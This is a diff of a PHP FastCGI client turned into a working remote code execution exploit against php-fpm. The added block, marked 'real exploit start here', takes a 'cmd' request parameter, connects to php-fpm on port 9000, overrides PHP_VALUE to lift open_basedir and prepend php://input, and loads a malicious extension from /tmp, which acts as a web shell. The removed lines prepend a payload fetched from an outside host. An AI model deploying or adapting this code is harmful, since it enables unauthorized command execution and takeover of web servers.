@@ -16,7 +16,7 @@
 /**
  * Handles communication with a FastCGI application
  *
- * @author      Pierrick Charron <pierrick@webstart.fr> 
+ * @author      Pierrick Charron <pierrick@webstart.fr>
  * @version     1.0
  */
 class FCGIClient
@@ -104,7 +104,8 @@ class FCGIClient
     private function connect()
     {
         if (!$this->_sock) {
-            $this->_sock = fsockopen($this->_host, $this->_port, $errno, $errstr, 5);
+            //$this->_sock = fsockopen($this->_host, $this->_port, $errno, $errstr, 5);
+            $this->_sock = stream_socket_client($this->_host, $errno, $errstr, 5);
             if (!$this->_sock) {
                 throw new Exception('Unable to connect to FastCGI application');
             }
@@ -158,7 +159,39 @@ class FCGIClient
         /* nameData & valueData */
         return $nvpair . $name . $value;
     }
-    
+    /**
+     * Read a set of FastCGI Name value pairs
+     *
+     * @param String $data Data containing the set of FastCGI NVPair
+     * @return array of NVPair
+     */
+    private function readNvpair($data, $length = null)
+    {
+        $array = array();
+        if ($length === null) {
+            $length = strlen($data);
+        }
+        $p = 0;
+        while ($p != $length) {
+            $nlen = ord($data[$p++]);
+            if ($nlen >= 128) {
+                $nlen = ($nlen & 0x7F << 24);
+                $nlen |= (ord($data[$p++]) << 16);
+                $nlen |= (ord($data[$p++]) << 8);
+                $nlen |= (ord($data[$p++]));
+            }
+            $vlen = ord($data[$p++]);
+            if ($vlen >= 128) {
+                $vlen = ($nlen & 0x7F << 24);
+                $vlen |= (ord($data[$p++]) << 16);
+                $vlen |= (ord($data[$p++]) << 8);
+                $vlen |= (ord($data[$p++]));
+            }
+            $array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen);
+            $p += ($nlen + $vlen);
+        }
+        return $array;
+    }
     /**
      * Decode a FastCGI Packet
      *
@@ -168,12 +201,12 @@ class FCGIClient
     private function decodePacketHeader($data)
     {
         $ret = array();
-        $ret['version']       = ord($data{0});
-        $ret['type']          = ord($data{1});
-        $ret['requestId']     = (ord($data{2}) << 8) + ord($data{3});
-        $ret['contentLength'] = (ord($data{4}) << 8) + ord($data{5});
-        $ret['paddingLength'] = ord($data{6});
-        $ret['reserved']      = ord($data{7});
+        $ret['version']       = ord($data[0]);
+        $ret['type']          = ord($data[1]);
+        $ret['requestId']     = (ord($data[2]) << 8) + ord($data[3]);
+        $ret['contentLength'] = (ord($data[4]) << 8) + ord($data[5]);
+        $ret['paddingLength'] = ord($data[6]);
+        $ret['reserved']      = ord($data[7]);
         return $ret;
     }
     /**
@@ -201,7 +234,27 @@ class FCGIClient
             return false;
         }
     }
-    
+    /**
+     * Get Informations on the FastCGI application
+     *
+     * @param array $requestedInfo information to retrieve
+     * @return array
+     */
+    public function getValues(array $requestedInfo)
+    {
+        $this->connect();
+        $request = '';
+        foreach ($requestedInfo as $info) {
+            $request .= $this->buildNvpair($info, '');
+        }
+        fwrite($this->_sock, $this->buildPacket(self::GET_VALUES, $request, 0));
+        $resp = $this->readPacket();
+        if ($resp['type'] == self::GET_VALUES_RESULT) {
+            return $this->readNvpair($resp['content'], $resp['length']);
+        } else {
+            throw new Exception('Unexpected response type, expecting GET_VALUES_RESULT');
+        }
+    }
     /**
      * Execute a request to the FastCGI application
      *
@@ -229,6 +282,7 @@ class FCGIClient
         fwrite($this->_sock, $request);
         do {
             $resp = $this->readPacket();
+            if(!$resp){break;}
             if ($resp['type'] == self::STDOUT || $resp['type'] == self::STDERR) {
                 $response .= $resp['content'];
             }
@@ -236,7 +290,7 @@ class FCGIClient
         if (!is_array($resp)) {
             throw new Exception('Bad request');
         }
-        switch (ord($resp['content']{4})) {
+        switch (ord($resp['content'][4])) {
             case self::CANT_MPX_CONN:
                 throw new Exception('This app can\'t multiplex [CANT_MPX_CONN]');
                 break;
@@ -251,50 +305,31 @@ class FCGIClient
         }
     }
 }
-?>
 
+// real exploit start here
+if (isset($_REQUEST['cmd'])) {
+    // ---- BEGIN CONFIG
+    $ext_dir_path = '/tmp';
+    $ext_name = 'hello.so';
+    // ---- END CONFIG
 
-<?php
-
-/************ config ************/
-
-// your extension directory path
-$ext_dir_path = '/var/www/app/ext/';
-
-// your extension name
-$ext_name = 'hello.so';
-
-// unix socket path or tcp host
-$connect_path = 'unix:///var/run/php/php7.2-fpm.sock';
-
-// tcp connection port (unix socket: -1)
-$port = -1;
-
-// Don't use this exploit file itself
-$filepath = '/var/www/app/index.php';
-
-// your php payload location
-$prepend_file_path = 'http://kaibro.tw/gginin2';
-
-/********************************/
-
-$req = '/' . basename($filepath);
-$uri = $req;
-$client = new FCGIClient($connect_path, $port);
-
-// disable open_basedir and open allow_url_include
-$php_value = "allow_url_include = On\nopen_basedir = /\nauto_prepend_file = " . $prepend_file_path;
-$php_admin_value = "extension_dir=" . $ext_dir_path . "\nextension=" . $ext_name;
-
-$params = array(       
+    $req = '/'.basename(__FILE__);
+    $uri = $req .'?'.'command='.$_REQUEST['cmd'];
+    $client = new FCGIClient("127.0.0.1:9000", -1);
+    //$client = new FCGIClient("unix:///var/run/php/php-fpm.sock", -1);
+    $code = "<?php echo '\$\$';hello_world(\$_REQUEST['command']);?>";
+    $php_value = "allow_url_include = On\nopen_basedir = /\nauto_prepend_file = php://input";
+    $php_admin_value = "extension_dir=" . $ext_dir_path . "\nextension=" . $ext_name;
+    $params = array(
         'GATEWAY_INTERFACE' => 'FastCGI/1.0',
-        'REQUEST_METHOD'    => 'GET',
-        'SCRIPT_FILENAME'   => $filepath,
+        'REQUEST_METHOD'    => 'POST',
+        'SCRIPT_FILENAME'   => __FILE__,
         'SCRIPT_NAME'       => $req,
+        'QUERY_STRING'      => 'command='.$_REQUEST['cmd'],
         'REQUEST_URI'       => $uri,
         'DOCUMENT_URI'      => $req,
         'PHP_VALUE'         => $php_value,
- 	    'PHP_ADMIN_VALUE'   => $php_admin_value,
+        'PHP_ADMIN_VALUE'   => $php_admin_value,
         'SERVER_SOFTWARE'   => 'kaibro-fastcgi-rce',
         'REMOTE_ADDR'       => '127.0.0.1',
         'REMOTE_PORT'       => '9985',
@@ -302,11 +337,18 @@ $params = array(
         'SERVER_PORT'       => '80',
         'SERVER_NAME'       => 'localhost',
         'SERVER_PROTOCOL'   => 'HTTP/1.1',
+        'CONTENT_LENGTH'    => strlen($code)
         );
-
-// print_r($_REQUEST);
-// print_r($params);
-
-echo "Call: $uri\n\n";
-echo $client->request($params, NULL);
+    try{
+        $resp = $client->request($params, $code);
+        $idx = strpos($resp, '$$');
+        if ($idx !== false){
+            echo substr($resp, $idx+2);
+        }
+    }
+    catch(Exception $e){
+        echo "If you used the param cmd and it didn't print anything, please try to refresh";
+    }
+    
+}
 ?>
